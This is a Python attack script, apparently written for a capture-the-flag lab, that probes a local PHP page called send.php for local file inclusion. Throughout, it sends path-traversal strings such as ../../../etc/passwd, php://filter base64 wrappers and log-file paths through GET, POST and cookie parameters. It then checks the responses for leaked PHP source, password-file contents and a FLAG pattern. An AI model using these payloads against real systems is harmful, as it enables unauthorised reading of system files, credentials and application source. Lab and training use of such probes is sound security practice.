import requests
import re

base_url = "http://127.0.0.1:32826/send.php"

# Let's examine the actual content being returned
print("="*70)
print("ANALYZING RESPONSE CONTENT")
print("="*70)

# Test a few variants and see what we get
samples = [
    ("file", "send.php"),
    ("file", "php://filter/convert.base64-encode/resource=send.php"),
    ("page", "../../../etc/passwd"),
    ("file", "nonexistent.php"),  # Test error handling
]

for param, payload in samples:
    print(f"\n[TEST] {param}={payload}")
    print("-"*70)
    
    url = f"{base_url}?{param}={payload}"
    response = requests.get(url, timeout=5)
    
    print(f"URL: {url}")
    print(f"Status: {response.status_code}")
    print(f"Size: {len(response.content)}B")
    print(f"Headers: {dict(response.headers)}")
    
    content = response.text
    print(f"\nContent preview (first 500 chars):")
    print(content[:500])
    
    # Try to detect what this is
    if "<!DOCTYPE" in content or "<html" in content:
        print("\n[ANALYSIS] This appears to be HTML content - likely the main page")
    elif "<?php" in content:
        print("\n[!] PHP SOURCE DETECTED!")
    elif "PD9w" in content:  # Base64 of "<?p"
        print("\n[!] BASE64 ENCODED PHP SOURCE DETECTED!")
    elif "root:" in content or "/bin/bash" in content:
        print("\n[!] ETC/PASSWD CONTENT DETECTED!")
    else:
        print("\n[ANALYSIS] Unknown content type")
    
    # Check for SQL patterns
    sql_patterns = ["SELECT", "INSERT", "UPDATE", "DELETE", "FROM messages", "FROM users"]
    found = [p for p in sql_patterns if p.lower() in content.lower()]
    if found:
        print(f"[SQL PATTERNS] {' | '.join(found)}")
    
    # Check for FLAG
    flag_match = re.search(r'FLAG\{[^}]+\}', content)
    if flag_match:
        print(f"\n[!] FLAG FOUND: {flag_match.group()}")
    
    print("\n" + "="*70)

# Now try POST method - some applications only process includes via POST
print("\n" + "="*70)
print("TESTING POST METHOD FOR FILE INCLUSION")
print("="*70)

post_tests = [
    ("file", "php://filter/convert.base64-encode/resource=send.php"),
    ("page", "../../../etc/passwd"),
    ("include", "../../../var/log/apache2/access.log"),
    ("load", "file:///var/www/html/send.php"),
]

for param, payload in post_tests:
    print(f"\n[POST TEST] {param}={payload}")
    
    try:
        response = requests.post(base_url, data={param: payload}, timeout=5)
        print(f"Status: {response.status_code} | Size: {len(response.content)}B")
        
        content = response.text
        if "<?php" in content and len(content.strip()) > 200:
            print("[!] PHP SOURCE DETECTED via POST!")
            print(content[:500])
            
            # Look for SQL
            sql_patterns = ["SELECT", "INSERT", "UPDATE", "FROM messages", "FROM users"]
            found = [p for p in sql_patterns if p.lower() in content.lower()]
            if found:
                print(f"[SQL] {' | '.join(found)}")
        elif "root:" in content:
            print("[!] ETC/PASSWD via POST!")
            print(content[:300])
            
        # Check for FLAG
        flag_match = re.search(r'FLAG\{[^}]+\}', content)
        if flag_match:
            print(f"\n[!] FLAG FOUND: {flag_match.group()}")
            
    except Exception as e:
        print(f"[ERROR] {e}")

print("\n" + "="*70)
print("ANALYSIS COMPLETE")
print("="*70)
print("Based on consistent 73628B responses, the application either:")
print("1. Requires authentication for file inclusion")
print("2. Has strict filtering that blocks all inclusion attempts")
print("3. Processing includes server-side but not returning results")
print("4. Is displaying cached/rendered content only")

# Try to get a baseline - what's on the normal page?
print("\n" + "="*70)
print("BASELINE ANALYSIS - Normal send.php load")
print("="*70)

response = requests.get(base_url, timeout=5)
print(f"Normal request to {base_url}")
print(f"Status: {response.status_code}")
print(f"Size: {len(response.content)}B")
print(f"Content-Type: {response.headers.get('content-type', 'N/A')}")
print(f"\nFirst 300 chars:")
print(response.text[:300])

# Try Cookie-based parameter (some apps use $_REQUEST)
print("\n" + "="*70)
print("TESTING COOKIE-BASED PARAMETER INJECTION")
print("="*70)

cookie_tests = [
    "../../../etc/passwd",
    "php://filter/convert.base64-encode/resource=send.php",
    "/var/www/html/send.php"
]

for payload in cookie_tests:
    print(f"\n[COOKIE TEST] file={payload}")
    cookies = {'file': payload}
    response = requests.get(base_url, cookies=cookies, timeout=5)
    
    print(f"Status: {response.status_code} | Size: {len(response.content)}B")
    
    if "<?php" in response.text or "root:" in response.text:
        print("[!] SUCCESS via Cookie!")
        print(response.text[:300])
